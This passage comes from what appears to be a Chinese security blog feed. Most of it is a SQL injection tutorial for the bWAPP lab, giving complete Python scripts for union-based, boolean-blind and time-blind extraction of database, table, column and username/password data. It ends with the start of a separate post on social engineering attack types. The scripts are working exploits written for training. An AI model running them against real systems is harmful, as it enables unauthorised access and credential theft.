class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line">from lxml import etree  </span><br><span class="line"></span><br><span class="line">for i in range(100):  </span><br><span class="line">    url = f&quot;http://cntj8003.ia.aqlab.cn/?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=&#x27;admin&#x27; limit &#123;i&#125;,1&quot;  </span><br><span class="line">    response = requests.get(url)  </span><br><span class="line">    response.encoding = &quot;utf8&quot;  </span><br><span class="line">    response_tree = etree.HTML(response.text)  </span><br><span class="line">    database = response_tree.xpath(&quot;/html/body/div[1]/div[3]/text()&quot;)  </span><br><span class="line">    if database == [&#x27;\n  &#x27;]:  </span><br><span class="line">        break    </span><br><span class="line">    else:        </span><br><span class="line">        print(database)</span><br></pre></td></tr></table></figure><p>这里有两个字段我们需要注意，一个是username，一个是password。</p><p>我们现在知道了数据库名，知道了表名，知道了字段名，现在搞字段内容就简单了</p><p><img src="\media\2022\12\Pasted-image-20221225193458.webp" alt=""></p><p>这样就得到了username字段的内容</p><p><img src="\media\2022\12\Pasted-image-20221225193537.webp" alt=""></p><p>这样就得到了密码</p><h2 id="四-数字类注入和字符串类注入"><a href="#四-数字类注入和字符串类注入" class="headerlink" title="四. 数字类注入和字符串类注入"></a>四. 数字类注入和字符串类注入</h2><p>我们刚才那个例子注没注意到，他是id=1</p><p>但是有的时候我们见到的不是这样的</p><p>比如我们搜索一个电影的时候，它就是这样 movie = ‘钢铁侠’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 数据库 where movie = &#x27;钢铁侠&#x27;</span><br></pre></td></tr></table></figure><p>这样就能查看数据库中有关钢铁侠的信息了</p><p>id=1 叫做数字型注入</p><p>movie = ‘钢铁侠’ 这种叫做字符串型注入</p><p>我们在注入的时候要注意那两个引号</p><p>比如这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 数据库 where movie = &#x27;钢铁侠 and 1=1&#x27;</span><br></pre></td></tr></table></figure><p>这样的话数据库查询的是 ‘钢铁侠 and 1=1’ ，这样是没有数据的</p><p>我们这时候应该再加上一个引号和一个注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 数据库 where movie = &#x27;钢铁侠&#x27; and 1=1 -- &#x27;</span><br></pre></td></tr></table></figure><p>这样传入数据库的就是 ‘钢铁侠’ and 1=1 —</p><p>这样就能避开引号的问题</p><h2 id="五-盲注"><a href="#五-盲注" class="headerlink" title="五. 盲注"></a>五. 盲注</h2><h3 id="1-盲注介绍"><a href="#1-盲注介绍" class="headerlink" title="1. 盲注介绍"></a>1. 盲注介绍</h3><h4 id="1-盲注的使用场景"><a href="#1-盲注的使用场景" class="headerlink" title="(1) 盲注的使用场景"></a>(1) 盲注的使用场景</h4><p>有时目标存在注入,但在页面上没有任何回显,此时，我们需要利用些方法进行判断或者尝试得到数据，这个过程称之为盲注。</p><p>比如这样的</p><p><img src="\media\2022\12\Pasted-image-20221225201245.webp" alt=""></p><p>他这个结果是通过邮箱发给你的，不会在页面上显示，这就是一种没有回显的例子</p><h4 id="2-盲注类型"><a href="#2-盲注类型" class="headerlink" title="(2) 盲注类型"></a>(2) 盲注类型</h4><h5 id="1、布尔盲注"><a href="#1、布尔盲注" class="headerlink" title="1、布尔盲注"></a>1、布尔盲注</h5><p>布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息</p><p>布尔盲注的使用场所只有两种情况，比如找到或没找到</p><p>我们需要通过它返回的情况来判断我们写的SQL语句是否成立</p><p>如果返回找到，说明SQL语句成立；如果返回没找到，就是说明SQL语句不成立</p><h5 id="2、时间盲注"><a href="#2、时间盲注" class="headerlink" title="2、时间盲注"></a>2、时间盲注</h5><p>界面返回值只有一种，true 无论输入任何值，返回情况都会按正常的来处理。</p><p>加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p><p>时间盲注和布尔盲注差不多，代码脚本也特别相似</p><p>不过一个是通过返回的结果一个是通过返回的时间</p><p>这个通过返回时间可能有些人不太明白</p><p>我们知道sleep()函数可以让数据库延迟显示内容</p><p>那如果我们在后面加上sleep函数并用and相连的话，是不是就可以通过时间来判断了</p><p>比如我想让数据库5秒后返回结果，就是sleep(5)。</p><p>如果它1秒就返回了，说明SQL语句错误；如果5秒后返回说明SQL语句正确</p><p>我们可以在抓包区域看时间</p><p><img src="\media\2022\12\Pasted-image-20221226154907.webp" alt=""></p><p>也可以用脚本通过设置 time1 和 time2 让他们相减得到时间差</p><p>这个sleep函数还有一个神奇的小特性</p><p>我们看这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `admin` WHERE fenshu=60 and sleep(1)</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226161949.webp" alt=""></p><p>正常来说，它不应该是花费1秒吗？为啥花费了3秒？</p><p>我们看看and前面的那部分返回的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `admin` WHERE fenshu=60</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226162149.webp" alt=""></p><p>它有三条数据，说明在加上sleep后，每一条数据都会执行sleep，所以刚才睡了3秒</p><p>我们可以通过这个特性来判断当前页面应该有几条数据</p><h3 id="2-盲注演示"><a href="#2-盲注演示" class="headerlink" title="2. 盲注演示"></a>2. 盲注演示</h3><p>盲注的流程比较繁琐</p><p>数据库名称的长度 -&gt; 数据库名称 -&gt; 数据库有几张表 -&gt; 表名长度 -&gt; 表名 -&gt; 表下有几个字段 -&gt; 表的字段名 -&gt; 字段内容</p><p>我们演示一下两个盲注方式</p><h4 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="(1) 布尔盲注"></a>(1) 布尔盲注</h4><p>页面时这样的</p><p><img src="\media\2022\12\Pasted-image-20221226105256.webp" alt=""></p><p>我们搜索一下a</p><p><img src="\media\2022\12\Pasted-image-20221226105324.webp" alt=""></p><p>显示a这个电影不在数据库里</p><p>因为它是搜电影的，电影名称是字符串，所以他应该是字符串注入</p><p>我们输入 1’ or 1=1</p><p><img src="\media\2022\12\Pasted-image-20221226105827.webp" alt=""></p><p>可以看到现在就说电影在数据库里了</p><p>数据对了，就返回该数据在数据库，就是true；数据不对，就返回该数据不在数据库，就是False</p><p>我们可以使用布尔盲注</p><p>我们先猜数据库长度，使用length函数，length(database())=? 如果这个对了的话就会返回 The movie exists in our database!</p><p>我们可以写一个脚本</p><p><img src="\media\2022\12\Pasted-image-20221226111648.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">for i in range(100):  </span><br><span class="line">    url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or length(database())=&#123;i&#125; -- &quot;    headers = &#123;  </span><br><span class="line">        &quot;cookie&quot;: &quot;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">    response = requests.get(url, headers=headers)  </span><br><span class="line">    response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">    if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">        print(f&quot;数据库长度为：&#123;i&#125;&quot;)  </span><br><span class="line">        break    </span><br><span class="line">    else:        </span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>这样就得到了数据库名称长度为5</p><p>接下来就是获取数据库的名称了</p><p>我们得到了数据库的长度，然后就是根据这个数字设置循环的次数</p><p>比如长度是4，我们就设置4次循环。我们每次循环都要得到这次循环对应的第几个字符的ascii码然后转换成对应的值</p><p>比如在第一次循环，应该取的是数据库的第一个字符，我们把这个字符的ascii拿到手，然后在把ascii转换从对应的字母</p><p>我们先简单构建一下SQL语句</p><p>我们需要截取字符串，用到 substr()；需要ascii码，用到ascii()/ord()；ascii码能用上的范围是 33~126</p><p>这个SQL语句就是 ascii(substr(database(),这里改,1))=这里改</p><p>理清思路后写脚本</p><p><img src="\media\2022\12\Pasted-image-20221226114840.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &#x27;cookie&#x27;: &#x27;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&#x27;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">for i in range(1, 6):  </span><br><span class="line">    for ii in range(33, 127):  </span><br><span class="line">        url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or ascii(substr(database(),&#123;i&#125;,1))=&#123;ii&#125; -- &quot;        response = requests.get(url, headers=headers)  </span><br><span class="line">        response.encoding = &quot;utf8&quot;  </span><br><span class="line">        if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">            print(f&quot;第&#123;i&#125;个字符是&#123;chr(ii)&#125;&quot;)  </span><br><span class="line">            break        </span><br><span class="line">        else:            </span><br><span class="line">            pass</span><br></pre></td></tr></table></figure><p>这样就得到了数据库名称为 bwapp</p><p>接下来就是获取bwapp下有几张表了</p><p>这里会用到 information_schema.tables 中的 table_name 和 table_schema</p><p>获取表的个数用到了count函数</p><p>简单构造一下SQL语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p>上脚本</p><p><img src="\media\2022\12\Pasted-image-20221226120726.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &#x27;cookie&#x27;: &#x27;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&#x27;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">for i in range(1, 100):  </span><br><span class="line">    url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or (select count(table_name) from information_schema.tables where table_schema=database())=&#123;i&#125; -- &quot;    response = requests.get(url, headers=headers)  </span><br><span class="line">    response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">    if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">        print(f&quot;有&#123;i&#125;张表&quot;)  </span><br><span class="line">        break    </span><br><span class="line">    else:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>得到有4张表</p><p>接下来就是要获取每张表的字段长度</p><p>这里的难点就是要获取 “每张表”，这个”每张表” 要怎么处理，这里就要加上 limit 了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length((select table_name from information_schema.tables where table_schema=database() limit 0,1))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">length(</span><br><span class="line">(select table_name from information_schema.tables where table_schema=database() limit 0,1)  </span><br><span class="line">// 这句话的意思是：</span><br><span class="line">// 从 information_schema.tables 筛选 table_schema=database() 的 table_name 字段内容，并且要第 limit 0,1 个</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>上脚本</p><p><img src="\media\2022\12\Pasted-image-20221226121918.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &#x27;cookie&#x27;: &#x27;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&#x27;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">for i in range(0, 4):  # 这里要注意 limit 是从0开始的  </span><br><span class="line">    for ii in range(0, 100):  </span><br><span class="line">        url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or length((select table_name from information_schema.tables where table_schema=database() limit &#123;i&#125;,1)) = &#123;ii&#125; -- &quot;        response = requests.get(url, headers=headers)  </span><br><span class="line">        response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">        if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">            print(f&quot;第&#123;i+1&#125;张表的长度为&#123;ii&#125;&quot;)  </span><br><span class="line">            break        </span><br><span class="line">        else:            </span><br><span class="line">            pass</span><br></pre></td></tr></table></figure><p>然后就是获取表名了</p><p>道理相同</p><p><img src="\media\2022\12\Pasted-image-20221226131426.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &#x27;cookie&#x27;: &#x27;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&#x27;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">list_ = [4, 6, 6, 5]  </span><br><span class="line"></span><br><span class="line">for i in range(4):  </span><br><span class="line">    print(f&quot;第&#123;i + 1&#125;张表名字为：&quot;)  </span><br><span class="line">    for ii in range(1, list_[i] + 1):  </span><br><span class="line">        for iii in range(33, 127):  </span><br><span class="line">            url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;i&#125;,1),&#123;ii&#125;,1))=&#123;iii&#125; -- &quot;            </span><br><span class="line">            response = requests.get(url, headers=headers)  </span><br><span class="line">            response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">            if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">                print(f&quot;&#123;chr(iii)&#125;&quot;)  </span><br><span class="line">                break            </span><br><span class="line">            else:                </span><br><span class="line">                pass</span><br></pre></td></tr></table></figure><p>这样我们就得到了那4张表</p><p>这里有一个表是users，我们要获取它的数据</p><p>然后就是老一套，把上面的代码简单改改就行了</p><p>获取users表有几个字段</p><p><img src="\media\2022\12\Pasted-image-20221226132154.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &#x27;cookie&#x27;: &#x27;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&#x27;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">for i in range(1, 100):  </span><br><span class="line">    url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=&#123;i&#125; -- &quot;    </span><br><span class="line">    response = requests.get(url, headers=headers)  </span><br><span class="line">    response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">    if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">        print(f&quot;user表有&#123;i&#125;个字段&quot;)  </span><br><span class="line">        break</span><br><span class="line">    else:        </span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>获取字段长度</p><p><img src="\media\2022\12\Pasted-image-20221226132847.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &#x27;cookie&#x27;: &#x27;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&#x27;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">for i in range(0, 9):  </span><br><span class="line">    for ii in range(0, 100):  </span><br><span class="line">        url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit &#123;i&#125;,1))=&#123;ii&#125; -- &quot;        </span><br><span class="line">        response = requests.get(url, headers=headers)  </span><br><span class="line">        response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">        if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">            print(f&quot;第&#123;i + 1&#125;个字段的长度为&#123;ii&#125;&quot;)  </span><br><span class="line">            break        </span><br><span class="line">        else:            </span><br><span class="line">            pass</span><br></pre></td></tr></table></figure><p>获取字段名</p><p><img src="\media\2022\12\Pasted-image-20221226133643.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &#x27;cookie&#x27;: &#x27;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&#x27;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">list_ = [2, 5, 8, 5, 6, 15, 9, 10, 5]  </span><br><span class="line"></span><br><span class="line">for i in range(9):  </span><br><span class="line">    print(f&quot;第&#123;i + 1&#125;个字段名字为：&quot;)  </span><br><span class="line">    for ii in range(1, list_[i] + 1):  </span><br><span class="line">        for iii in range(33, 127):  </span><br><span class="line">            url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit &#123;i&#125;,1),&#123;ii&#125;,1))=&#123;iii&#125; -- &quot;            </span><br><span class="line">            response = requests.get(url, headers=headers)  </span><br><span class="line">            response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">            if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">                print(f&quot;&#123;chr(iii)&#125;&quot;)  </span><br><span class="line">                break            </span><br><span class="line">            else:                </span><br><span class="line">                pass</span><br></pre></td></tr></table></figure><p>这其中有两个字段我们想要的，分别是login和password</p><p>我们现在知道了数据库名：bwapp；知道了表名：users；知道了字段名：login和password</p><p>现在就简单了，我们通过concat把两个字段的数据放一起，用@分隔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select concat(login,&#x27;@&#x27;,password) from users limit 0,1),1,1))</span><br></pre></td></tr></table></figure><p>由于数据有点多，我们可以采用多线程或者多进程模式</p><p><img src="\media\2022\12\Pasted-image-20221226153115.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line">from concurrent.futures import ThreadPoolExecutor  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &#x27;cookie&#x27;: &#x27;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&#x27;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():  </span><br><span class="line">    for iii in range(100):  </span><br><span class="line">        for i in range(100):  </span><br><span class="line">            for ii in range(33, 127):  </span><br><span class="line">                url = f&quot;http://192.168.211.176/bwapp/app/sqli_4.php?title=1&#x27; or ascii(substr((select concat(login,&#x27;@&#x27;,password) from users limit &#123;iii&#125;,1),&#123;i&#125;,1))=&#123;ii&#125; -- &quot;                </span><br><span class="line">                response = requests.get(url, headers=headers)  </span><br><span class="line">                response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">                if &quot;The movie exists in our database!&quot; in response.text:  </span><br><span class="line">                    print(f&quot;&#123;chr(ii)&#125;&quot;)  </span><br><span class="line">                    break                </span><br><span class="line">                else:                    </span><br><span class="line">                    pass        </span><br><span class="line">                    print(&quot;=&quot; * 60*)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:  </span><br><span class="line">    pools = ThreadPoolExecutor(500)  </span><br><span class="line">    pools.submit(main())</span><br></pre></td></tr></table></figure><p>OK搞定！</p><p>以上就是布尔盲注的内容，如果你是因为python不会或者是SQL语句看不懂，请仔细研究研究</p><h4 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="(2) 时间盲注"></a>(2) 时间盲注</h4><p>时间盲注几乎和布尔盲注一摸一样</p><p>我们看这个</p><p><img src="\media\2022\12\Pasted-image-20221226155121.webp" alt=""></p><p>这里返回的结果会通过邮件发给你，你是无法从页面得到任何数据。</p><p>无法得到回显要用盲注，这里还用不了布尔盲注，所以只能用时间盲注了</p><p>我们先获取一下数据库长度试试手</p><p>我们先正常访问一下，什么参数也不加</p><p><img src="\media\2022\12\Pasted-image-20221226155827.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line">import time  </span><br><span class="line"></span><br><span class="line">url = f&quot;http://192.168.211.176/bwapp/app/sqli_15.php?&quot;  </span><br><span class="line">headers = &#123;  </span><br><span class="line">    &quot;cookie&quot;: &quot;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">time1 = time.time()  </span><br><span class="line">response = requests.get(url, headers=headers)  </span><br><span class="line">time2 = time.time() </span><br><span class="line"></span><br><span class="line">print(time2 - time1) </span><br></pre></td></tr></table></figure><p>我们这里是先得到访问前的时间 time1 然后得到访问后的时间 time2 之后再相减就得到了时间差</p><p>我们加上sleep(1)</p><p><img src="\media\2022\12\Pasted-image-20221226162412.webp" alt=""></p><p>我们sleep(1) 结果返回了9秒多一点，说明当前页面应该有9条数据</p><p>所以只要时间差比9秒大，就i说明SQL语句成立</p><p>我们直接套用布尔盲注的代码，简单修改一下就行</p><p><img src="\media\2022\12\Pasted-image-20221226163747.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line">import time  </span><br><span class="line"></span><br><span class="line">for i in range(100):  </span><br><span class="line">    url = f&quot;http://192.168.211.176/bwapp/app/sqli_15.php?title=1&#x27; or length(database())=&#123;i&#125; and sleep(1) -- &quot;    </span><br><span class="line">    headers = &#123;  </span><br><span class="line">        &quot;cookie&quot;: &quot;PHPSESSID=19sa3pl9d689a4pbprhpmk4bm0; security_level=0&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    time1 = time.time()  </span><br><span class="line">    response = requests.get(url, headers=headers)  </span><br><span class="line">    response.encoding = &#x27;utf8&#x27;  </span><br><span class="line">    time2 = time.time()  </span><br><span class="line">    datatime = time2 - time1  </span><br><span class="line"></span><br><span class="line">    if datatime &gt; 9:  </span><br><span class="line">        print(f&quot;数据库长度为&#123;i&#125;&quot;)  </span><br><span class="line">        break    </span><br><span class="line">    else:        </span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>可以发现和布尔盲注就加了个时间差，if条件变了一下，参数加了个sleep函数，其他的一模一样。</p><p>这个就不演示了。自己改改就行，如果不会改就说明之前的东西没弄明白。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学攻击类型</title>
      <link href="/2023/02/16/26/"/>
      <url>/2023/02/16/26/</url>
      
        <content type="html"><![CDATA[<p>无论你的密码或安全设置有多强，黑客和攻击者都知道他们总是可以利用一个漏洞：<strong>你。</strong></p><p>社会工程攻击利用“人为漏洞”来绕过网络安全障碍。他们不是入侵你的帐户来窃取你的身份，而是通过使用网络钓鱼攻击、冒名顶替欺诈和其他骗局来入侵你。</p><h2 id="一-什么是社会工程攻击？"><a href="#一-什么是社会工程攻击？" class="headerlink" title="一. 什么是社会工程攻击？"></a>一. 什么是社会工程攻击？</h2><p>社会工程是“人为黑客”进行欺诈和身份盗用的行为。</p><p>黑客使用欺骗性的心理操纵来灌输恐惧、兴奋或紧迫感。一旦你处于高度情绪化的状态，他们就会用它来对付你，以掩盖你更好的判断力。</p><p>只需要一个人为错误就可以成为社会工程攻击的受害者。这个漏洞是犯罪分子更频繁地使用社会工程技术的原因。</p><h2 id="二-社会工程攻击如何工作？"><a href="#二-社会工程攻击如何工作？" class="headerlink" title="二. 社会工程攻击如何工作？"></a>二. 社会工程攻击如何工作？</h2><p>社会工程攻击相对简单。黑客需要做的就是说服一个消息不灵通、压力大或信任的人按照他们所说的去做。</p><p>这些攻击非常容易实现，并且它们都遵循类似的模式。</p><p><strong>社会工程攻击的四个阶段是：</strong></p><ol><li>发现和调查</li><li>欺骗和钓鱼</li><li>攻击</li><li>撤退</li></ol><h3 id="1-发现和调查"><a href="#1-发现和调查" class="headerlink" title="1. 发现和调查"></a>1. 发现和调查</h3><p>攻击者首先要确定他们正在寻找的目标所拥有的漏洞。这通常包括凭据、数据、未经授权的访问、金钱、机密信息等。</p><p>然后他们在网上寻找潜在的受害者。例如，他们会查看你的在线足迹，查看你的工作地点，记下你在社交媒体上分享的内容等等。</p><p>一旦他们知道你是谁，黑客就会使用这些信息来制作完美的个性化攻击。而且由于攻击者对你了解得太多，你更有可能降低警惕。</p><h3 id="2-欺骗和钩子"><a href="#2-欺骗和钩子" class="headerlink" 